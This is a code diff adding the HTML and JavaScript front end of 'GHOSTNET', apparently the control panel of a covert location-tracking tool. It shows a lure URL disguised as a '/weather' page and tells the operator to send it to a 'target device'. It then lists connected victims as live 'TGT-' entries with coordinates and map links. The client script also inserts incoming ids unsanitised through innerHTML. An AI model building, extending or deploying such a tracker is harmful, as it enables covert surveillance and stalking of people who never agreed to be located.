@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GHOSTNET // COMMAND CENTER</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=VT323&family=Orbitron:wght@500;700;900&display=swap"
+        rel="stylesheet">
+    <style>
+        :root {
+            --bg: #02060c;
+            --panel: rgba(6, 16, 26, 0.85);
+            --line: rgba(0, 255, 102, 0.25);
+            --green: #00ff66;
+            --dim-green: #0a8f46;
+            --cyan: #00e5ff;
+            --red: #ff2a4d;
+            --amber: #ffb000;
+            --text: #c9ffe0;
+            --muted: #4a7a63;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
+            height: 100%;
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Share Tech Mono', 'Courier New', monospace;
+            overflow: hidden;
+            position: relative;
+        }
+
+        #matrix {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            opacity: 0.45;
+        }
+
+        .scanlines {
+            position: fixed;
+            inset: 0;
+            z-index: 2;
+            pointer-events: none;
+            background: repeating-linear-gradient(0deg,
+                    rgba(0, 0, 0, 0.22) 0px,
+                    rgba(0, 0, 0, 0.22) 1px,
+                    transparent 1px,
+                    transparent 3px);
+            mix-blend-mode: multiply;
+        }
+
+        .vignette {
+            position: fixed;
+            inset: 0;
+            z-index: 2;
+            pointer-events: none;
+            background: radial-gradient(ellipse at center,
+                    transparent 55%,
+                    rgba(0, 0, 0, 0.55) 100%);
+        }
+
+        .shell {
+            position: relative;
+            z-index: 3;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 14px;
+            gap: 12px;
+            max-width: 980px;
+            margin: 0 auto;
+        }
+
+        /* ---- HUD header ---- */
+        .hud {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+            flex-wrap: wrap;
+            padding: 10px 14px;
+            background: var(--panel);
+            border: 1px solid var(--line);
+            box-shadow: 0 0 18px rgba(0, 255, 102, 0.12), inset 0 0 22px rgba(0, 255, 102, 0.04);
+            clip-path: polygon(0 0, calc(100% - 16px) 0, 100% 16px, 100% 100%, 16px 100%, 0 calc(100% - 16px));
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo {
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 900;
+            font-size: 18px;
+            letter-spacing: 3px;
+            color: var(--green);
+            text-shadow: 0 0 12px rgba(0, 255, 102, 0.8);
+            white-space: nowrap;
+        }
+
+        .logo .bracket {
+            color: var(--cyan);
+            text-shadow: 0 0 10px rgba(0, 229, 255, 0.8);
+        }
+
+        .blink {
+            color: var(--green);
+            animation: blink 1s steps(2, start) infinite;
+            font-size: 20px;
+        }
+
+        .hud-right {
+            display: flex;
+            align-items: center;
+            gap: 18px;
+            flex-wrap: wrap;
+        }
+
+        .hud-item {
+            font-size: 13px;
+            color: var(--muted);
+            letter-spacing: 1px;
+        }
+
+        .hud-item code {
+            color: var(--cyan);
+            background: rgba(0, 229, 255, 0.08);
+            padding: 2px 6px;
+            border: 1px solid rgba(0, 229, 255, 0.3);
+        }
+
+        .hud-item .status {
+            color: var(--green);
+        }
+
+        .hud-item .status.down {
+            color: var(--amber);
+        }
+
+        /* ---- Terminal window ---- */
+        .term-window {
+            flex: 1;
+            min-height: 0;
+            display: flex;
+            flex-direction: column;
+            background: var(--panel);
+            border: 1px solid var(--line);
+            box-shadow: 0 0 24px rgba(0, 255, 102, 0.1);
+        }
+
+        .term-titlebar {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 12px;
+            background: rgba(0, 255, 102, 0.06);
+            border-bottom: 1px solid var(--line);
+            font-size: 12px;
+            color: var(--muted);
+            letter-spacing: 1px;
+        }
+
+        .dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+
+        .dot.red {
+            background: var(--red);
+            box-shadow: 0 0 8px var(--red);
+        }
+
+        .dot.amber {
+            background: var(--amber);
+            box-shadow: 0 0 8px var(--amber);
+        }
+
+        .dot.green {
+            background: var(--green);
+            box-shadow: 0 0 8px var(--green);
+        }
+
+        .term-title {
+            margin-left: 8px;
+        }
+
+        .term-body {
+            flex: 1;
+            overflow-y: auto;
+            padding: 18px 20px;
+            font-size: 15px;
+            line-height: 1.6;
+            scrollbar-width: thin;
+            scrollbar-color: var(--dim-green) transparent;
+        }
+
+        .term-body::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .term-body::-webkit-scrollbar-thumb {
+            background: var(--dim-green);
+        }
+
+        .prompt {
+            color: var(--green);
+        }
+
+        .prompt .user {
+            color: var(--cyan);
+        }
+
+        .prompt .path {
+            color: var(--amber);
+        }
+
+        .typed {
+            color: var(--text);
+        }
+
+        .typed .caret {
+            display: inline-block;
+            width: 8px;
+            height: 15px;
+            background: var(--green);
+            vertical-align: text-bottom;
+            margin-left: 2px;
+            animation: blink 1s steps(2, start) infinite;
+        }
+
+        .output {
+            color: var(--muted);
+            margin: 6px 0 4px;
+        }
+
+        .output .ok {
+            color: var(--green);
+        }
+
+        .output .count {
+            color: var(--cyan);
+        }
+
+        .target-list {
+            margin-top: 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .target-link {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 12px 16px;
+            background: rgba(0, 255, 102, 0.04);
+            border: 1px solid rgba(0, 255, 102, 0.2);
+            color: var(--text);
+            text-decoration: none;
+            transition: all 0.15s ease;
+            clip-path: polygon(0 0, calc(100% - 10px) 0, 100% 10px, 100% 100%, 10px 100%, 0 calc(100% - 10px));
+        }
+
+        .target-link:hover {
+            background: rgba(0, 255, 102, 0.12);
+            border-color: var(--green);
+            box-shadow: 0 0 16px rgba(0, 255, 102, 0.25);
+            transform: translateX(4px);
+        }
+
+        .target-link .idx {
+            color: var(--cyan);
+            font-size: 12px;
+            letter-spacing: 2px;
+            min-width: 56px;
+        }
+
+        .target-link .tgt {
+            font-weight: bold;
+            color: var(--green);
+            letter-spacing: 1px;
+            text-shadow: 0 0 8px rgba(0, 255, 102, 0.5);
+            flex: 1;
+        }
+
+        .target-link .coords {
+            color: var(--muted);
+            font-size: 13px;
+        }
+
+        .target-link .arrow {
+            color: var(--amber);
+        }
+
+        .empty-msg {
+            margin-top: 18px;
+            padding: 14px;
+            border: 1px dashed rgba(255, 176, 0, 0.4);
+            color: var(--amber);
+            background: rgba(255, 176, 0, 0.04);
+        }
+
+        .empty-msg.hidden {
+            display: none;
+        }
+
+        .blink-amber {
+            animation: blink 1.4s steps(2, start) infinite;
+        }
+
+        /* ---- Footer ---- */
+        .footer-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 10px;
+            flex-wrap: wrap;
+            padding: 8px 14px;
+            font-size: 12px;
+            color: var(--muted);
+            background: var(--panel);
+            border: 1px solid var(--line);
+            letter-spacing: 1px;
+        }
+
+        .footer-bar .creator {
+            color: var(--dim-green);
+        }
+
+        .footer-bar .clock {
+            color: var(--cyan);
+        }
+
+        @keyframes blink {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0;
+            }
+        }
+
+        @media (max-width: 720px) {
+            .logo {
+                font-size: 15px;
+            }
+
+            .hud-item code {
+                font-size: 11px;
+            }
+
+            .target-link {
+                flex-wrap: wrap;
+            }
+
+            .target-link .coords {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <canvas id="matrix"></canvas>
+    <div class="scanlines"></div>
+    <div class="vignette"></div>
+
+    <main class="shell">
+        <header class="hud">
+            <div class="brand">
+                <span class="logo"><span class="bracket">[</span>GHOSTNET<span class="bracket">]</span></span>
+                <span class="blink">▮</span>
+            </div>
+            <div class="hud-right">
+                <span class="hud-item">UPLINK: <code>{{ global.remoteURL }}/weather</code></span>
+                <span class="hud-item" id="conn-status">LINK: <span class="status down">STANDBY</span></span>
+            </div>
+        </header>
+
+        <section class="term-window">
+            <div class="term-titlebar">
+                <span class="dot red"></span>
+                <span class="dot amber"></span>
+                <span class="dot green"></span>
+                <span class="term-title">ghostnet://active-targets</span>
+            </div>
+            <div class="term-body">
+                <p class="prompt"><span class="user">root@ghostnet</span>:<span class="path">~/targets</span>$ <span
+                        class="typed">list --active<span class="caret"></span></span></p>
+                <p class="output"><span class="ok">[ OK ]</span> DECRYPTED TARGET INDEX — <span class="count"
+                        id="target-count">0</span> ACTIVE</p>
+
+                <div id="tar-content" class="target-list">
+                    {{ for(value, key in TARGETS) }}
+                    <a href="/map?id={{ key }}" class="target-link">
+                        <span class="idx">TGT-{{ key }}</span>
+                        <span class="tgt">{{ key }}</span>
+                        <span class="coords">[ {{- value }} ]</span>
+                        <span class="arrow">▸</span>
+                    </a>
+                    {{/}}
+                </div>
+
+                <p class="empty-msg" id="empty-msg">
+                    <span class="blink-amber">[ ! ]</span> NO ACTIVE TARGETS — SEND THE UPLINK TO A TARGET DEVICE AND
+                    WAIT FOR A PING.
+                </p>
+            </div>
+        </section>
+
+        <footer class="footer-bar">
+            <span>GHOSTNET <span class="creator">v3.0.1</span> — CREATED BY AZHAN</span>
+            <span class="clock" id="clock">--:--:--</span>
+        </footer>
+    </main>
+
+    <script src="https://cdn.jsdelivr.net/npm/socket.io@4.8.1/client-dist/socket.io.min.js"></script>
+    <script>
+        const content = document.querySelector("#tar-content")
+        const emptyMsg = document.querySelector("#empty-msg")
+        const targetCount = document.querySelector("#target-count")
+        const connStatus = document.querySelector("#conn-status")
+        const clock = document.querySelector("#clock")
+
+        function updateCount() {
+            const n = document.querySelectorAll("#tar-content .target-link").length
+            targetCount.innerText = n
+            emptyMsg.classList.toggle("hidden", n > 0)
+        }
+
+        const socket = io("", {
+            secure: true,
+            path: "/socket.io",
+            transports: ['websocket']
+        })
+
+        socket.on("connect", () => {
+            connStatus.innerHTML = 'LINK: <span class="status">ONLINE</span>'
+        })
+
+        socket.on("disconnect", () => {
+            connStatus.innerHTML = 'LINK: <span class="status down">LOST</span>'
+        })
+
+        socket.on("user-connected", newId => {
+            const a = document.createElement('a')
+            a.href = `/map?id=${newId}`
+            a.className = "target-link"
+            a.innerHTML = `
+                <span class="idx">TGT-${newId}</span>
+                <span class="tgt">${newId}</span>
+                <span class="coords">[ PENDING ]</span>
+                <span class="arrow">▸</span>
+            `
+            content.appendChild(a)
+            updateCount()
+        })
+
+        function tick() {
+            const d = new Date()
+            const p = n => String(n).padStart(2, "0")
+            clock.innerText = `${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())} UTC`
+        }
+        tick()
+        setInterval(tick, 1000)
+        updateCount()
+
+        // matrix rain
+        const canvas = document.getElementById('matrix')
+        const ctx = canvas.getContext('2d')
+        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789#$%&*+=<>[]{}"
+        let w, h, cols, drops
+
+        function resize() {
+            w = canvas.width = window.innerWidth
+            h = canvas.height = window.innerHeight
+            cols = Math.floor(w / 16)
+            drops = Array.from({ length: cols }, () => Math.floor(Math.random() * -30))
+        }
+        resize()
+        window.addEventListener('resize', resize)
+
+        function draw() {
+            ctx.fillStyle = 'rgba(2, 6, 12, 0.08)'
+            ctx.fillRect(0, 0, w, h)
+            ctx.font = '16px monospace'
+            for (let i = 0; i < cols; i++) {
+                const ch = chars[Math.floor(Math.random() * chars.length)]
+                ctx.fillStyle = Math.random() > 0.975 ? '#aaffcc' : '#00cc55'
+                ctx.fillText(ch, i * 16, drops[i] * 16)
+                if (drops[i] * 16 > h && Math.random() > 0.975) drops[i] = 0
+                drops[i]++
+            }
+        }
+        setInterval(draw, 50)
+    </script>
+</body>
+
+</html>
